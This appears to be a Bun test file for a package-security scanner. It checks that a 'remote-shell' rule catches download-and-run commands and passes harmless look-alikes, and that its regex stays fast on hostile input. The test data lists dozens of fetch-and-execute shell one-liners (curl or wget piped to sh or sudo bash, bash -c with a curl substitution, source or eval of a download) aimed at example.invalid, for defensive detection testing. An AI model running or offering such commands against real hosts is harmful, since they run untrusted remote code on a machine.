// Download-and-run commands the remote-shell rule missed because of how they were written: a quoted URL, a shell named
// by its path or reached through env or sudo, dash, and the `sh -c "$(curl …)"` and `sh <(curl …)` forms. Each scored a
// clean 100. Payloads are harmless stand-ins (example.invalid).
import { describe, expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { analyze, finalize, SCORE_FLOOR, type AnalyzeInput, type TarEntry } from "../src/index.ts";
import { ms, slowOn } from "./fixtures/regex-timing.ts";

function entry(path: string, text: string): TarEntry {
  const data = new TextEncoder().encode(text);

  return { path, size: data.length, mode: 0o644, data };
}

function scoreOf(cmd: string) {
  const manifest: AnalyzeInput["manifest"] = { name: "probe-pkg", version: "1.0.0", license: "MIT", main: "index.js" };
  const files = [entry("package.json", JSON.stringify(manifest)), entry("index.js", `require('child_process').execSync(${JSON.stringify(cmd)});\n`)];
  const r = finalize(analyze({ name: "probe-pkg", manifest, files, publisher: "a", previousPublishers: [] }), { publishedAt: 0, now: 1e12, deprecated: null, status: "active", statusReason: null });

  return { score: r.score, ids: r.signals.map((s) => s.id) };
}

const URL = "https://example.invalid/x.sh";

describe("a command that downloads a script and runs it is a remote shell however it is written", () => {
  test("the unquoted form is the baseline", () => {
    expect(scoreOf(`curl -fsSL ${URL} | sh`).ids).toContain("remote-shell");
  });

  for (const cmd of [
    `curl -fsSL "${URL}" | sh`,
    `curl '${URL}' | bash`,
    `curl -H "Accept: */*" ${URL} | bash`,
    `curl -s ${URL} | /bin/sh`,
    `curl -s ${URL} | /usr/bin/env bash`,
    `curl -fsSL ${URL} | sudo -E bash`,
    `wget -qO- '${URL}' | sudo -E -H bash -`,
    `curl -fsSL ${URL} | dash`,
    `bash -c "$(curl -fsSL ${URL})"`,
    `sh -c "\`curl -fsSL ${URL}\`"`,
    `bash <(curl -fsSL ${URL})`,
    `. <(curl -fsSL ${URL})`,
    `cd /tmp && . <(curl -fsSL ${URL})`,
    `curl -s ${URL} | env -i bash`,
    `curl -s ${URL} | sudo -u root bash`,
    `curl -s ${URL} | doas -u root /bin/sh`,
    `curl -s "${URL}?a=1&b=2" | sh`,
    // an escaped quote is part of the header value, not the start of a quoted argument
    `curl -H X-Label:\\"value ${URL} | sh`,
    `curl -s ${URL} | env FOO=1 bash`,
    // a long option whose value is the next word
    `curl -s ${URL} | sudo --user root bash`,
    `curl -s ${URL} | env --unset FOO bash`,
    // a wrapper by path with options, and wrappers chained
    `curl -fsSL ${URL} | /usr/bin/env -i bash`,
    `curl -fsSL ${URL} | /usr/bin/env FOO=1 bash`,
    `curl -fsSL ${URL} | sudo env bash`,
    // the substitution forms where a command starts: by path, after a wrapper, inside sh -c
    `/bin/bash -c "$(curl -fsSL ${URL})"`,
    `sudo bash <(curl -fsSL ${URL})`,
    `true; source <(curl -fsSL ${URL})`,
    `sh -c 'bash <(curl -fsSL ${URL})'`,
    // after an assignment, or a wrapper with its options
    `FOO=1 bash -c "$(curl -fsSL ${URL})"`,
    `sudo -u root bash <(curl ${URL})`,
    `cd /tmp && env -i PATH=/bin sudo -E bash -c "$(curl -fsSL ${URL})"`,
    // an escaped | is part of the URL; the real pipe after it is still one
    `curl https://example.invalid/x\\|| sh`,
    // eval of a download where a command starts, and busybox's shell
    `eval "$(curl -fsSL ${URL})"`,
    "eval `curl -s " + URL + "`",
    `cd /tmp && eval "$(wget -qO- ${URL})"`,
    `curl -fsSL ${URL} | ash`,
    `curl -fsSL ${URL} | busybox sh`,
    `wget -qO- ${URL} | /bin/busybox ash`,
    // Windows' curl.exe, a download split over lines, and bash's |& pipe
    `curl.exe -fsSL ${URL} | bash`,
    `bash -c "$(wget.exe -qO- ${URL})"`,
    `curl -fsSL ${URL} \\\n  | sh`,
    `bash -c "$(\n  curl -fsSL ${URL}\n)"`,
    `bash <(\ncurl -fsSL ${URL})`,
    `curl -fsSL ${URL} |& sh`,
    // the file curl saved, run after a ; or &&
    `curl -s ${URL} -o /tmp/p; cat /tmp/p | sh`,
    `curl -s ${URL} -o /tmp/p && cat /tmp/p | bash`,
    `curl -fsSL -o p ${URL}; sh p`,
    `wget -qO setup.sh ${URL} && . setup.sh`,
    // a redirect is not a separator, and a long quoted URL is still one argument
    `curl -fsSL ${URL} 2>&1 | sh`,
    `curl -fsSL ${URL} 2>&1 | tee /tmp/l | sh`,
    `curl -fsSL ${URL} &>/dev/null | bash`,
    `curl "https://example.invalid/x?pad=${"a".repeat(240)}" | bash`,
    // the saved file run through a path or sudo
    `curl -s ${URL} -o /tmp/p; /bin/cat /tmp/p | sh`,
    `curl -s ${URL} -o /tmp/p && sudo cat /tmp/p | sh`,
    `curl -s ${URL} -o /tmp/p; sudo /bin/sh /tmp/p`,
  ]) {
    test(cmd, () => {
      const r = scoreOf(cmd);

      expect(r.ids).toContain("remote-shell");
      expect(r.score).toBeLessThan(SCORE_FLOOR);
    });
  }
});

describe("commands that do not run what they download are not", () => {
  for (const cmd of [
    `curl -fsSL "${URL}" -o x.sh`,
    `curl -s "${URL}" | shasum -a 256`,
    `curl -fsSL "${URL}" || bash fallback.sh`,
    `curl -s "${URL}" | grep version`,
    // a pipe inside a quoted argument is part of the URL, not a pipe
    `curl "https://example.invalid/search?q=foo|sh"`,
    `curl -s 'https://example.invalid/a|bash' -o out.txt`,
    `curl -s "${URL}" | sudo tee /etc/app/x.sh`,
    // a wrapper's command, not one of its options: grep searches the download for "bash"
    `curl -s ${URL} | env grep bash`,
    `curl -s ${URL} | sudo -u root grep bash`,
    `curl -s ${URL} | sudo --user root grep bash`,
    // env's split string is the command: here grep, with "bash" a word inside it
    `curl -s ${URL} | env --split-string 'grep bash'`,
    `curl -s ${URL} | env -S 'grep bash'`,
    // an option that takes a value takes the next word, even when it names a shell
    `curl -s ${URL} | env --unset bash grep version`,
    `curl -s ${URL} | sudo -u bash grep version`,
    // instructions a command only prints
    `printf '%s\\n' 'bash <(curl ${URL})'`,
    `printf '%s\\n' 'bash -c "$(curl -fsSL ${URL})"'`,
    `echo "then run: . <(curl ${URL})"`,
    `printf '%s\\n' 'FOO=1 sudo -u root bash <(curl ${URL})'`,
    // only a shell's -c takes a command: grep -c counts lines
    `grep -c bash <(curl -s ${URL})`,
    // a pipe after an unquoted ; or & belongs to another command, not to curl
    `curl -s 'https://example.invalid/list' -o out.txt; printf 'echo local' | sh`,
    `curl -s ${URL} -o out.txt && echo local | sh`,
    `curl -s ${URL} -o out.txt & echo local | bash`,
    // curl-config is a local tool, not curl
    `sh -c "$(curl-config --cc) --version"`,
    `bash <(curl-config --libs)`,
    `curl-config --libs | sh`,
    `curl-config.exe --libs | sh`,
    // a download on one line and a pipe on the next, with no continuation, are two commands
    `curl -fsSL ${URL} -o x.sh\necho local | sh`,
    // another file than the one curl saved
    `curl -s ${URL} -o out.txt; cat other.sh | sh`,
    `curl -s ${URL} -o out.txt && sh build.sh`,
    `curl -s ${URL} -o out.txt; cat out.txt.bak | sh`,
    `wget -qO- ${URL} > list.txt; sh -n check.sh`,
    // the saved file named in printed text is not run
    `curl -s ${URL} -o out.txt; printf '%s\\n' 'run sh out.txt now'`,
    `curl -s ${URL} -o out.txt; echo "then: cat out.txt | sh"`,
    // eval and busybox only where they run the download
    `printf '%s\\n' 'eval "$(curl -fsSL ${URL})"'`,
    `eval "$(ssh-agent -s)"`,
    `curl -s ${URL} | busybox wc -l`,
    `curl -s ${URL} | tee ash.log`,
  ]) {
    test(cmd, () => {
      expect(scoreOf(cmd).ids).not.toContain("remote-shell");
    });
  }
});

describe("the rule reads hostile text in linear time", () => {
  // the rule as written in facts.ts (not exported), read from its literal
  const src = readFileSync(join(import.meta.dir, "..", "src", "facts.ts"), "utf8");
  const literal = /^const REMOTE_SHELL =\n\s*\/(.+)\/([a-z]*);$/m.exec(src);
  const re = new RegExp(literal?.[1] ?? "", literal?.[2]);

  test("short runs with no spaces, where every separator starts a command, do not make it quadratic", () => {
    expect(literal).not.toBeNull();
    const units = ["x=|", "x=;", ";a=b", "|sudo -u x", "|env -ix=", "curl x|env a=", "|sudo --user="];

    expect(slowOn("REMOTE_SHELL", re, (_re, n) => units.map((u) => u.repeat(Math.ceil(n / u.length)).slice(0, n)), 64_000)).toEqual([]);
  });

  test("redirect characters that could be read two ways do not make it exponential", () => {
    // `>&>` once read as `>&` + `>` or `>` + `&>`; 40 triples would take hours if each doubled the paths
    expect(ms(re, `curl ${">&>".repeat(40)}`)).toBeLessThan(100);
    expect(ms(re, `curl ${"&>&".repeat(40)} x`)).toBeLessThan(100);
  });
});
